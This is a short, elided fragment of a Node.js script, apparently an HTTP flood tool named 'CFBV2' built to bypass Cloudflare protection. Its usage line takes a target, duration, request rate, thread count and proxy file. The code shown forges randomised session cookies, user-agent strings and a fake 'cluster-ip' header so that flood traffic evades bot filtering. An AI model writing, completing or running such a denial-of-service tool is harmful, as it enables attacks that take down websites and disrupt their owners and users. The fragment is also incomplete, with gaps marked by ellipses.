const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`Usage: node CFBV2 target time rate thread proxyfile`); process.exit();}
 const headers = {};
...
{ "cluster-ip": randstr(5)  },
 ...
 headers["Cookie"] = "PHPSESSID=" + randstr(15);
 ...
 headers["user-agent"] = uap1 + randstr(6);
 headers["TE"] = "trailers";
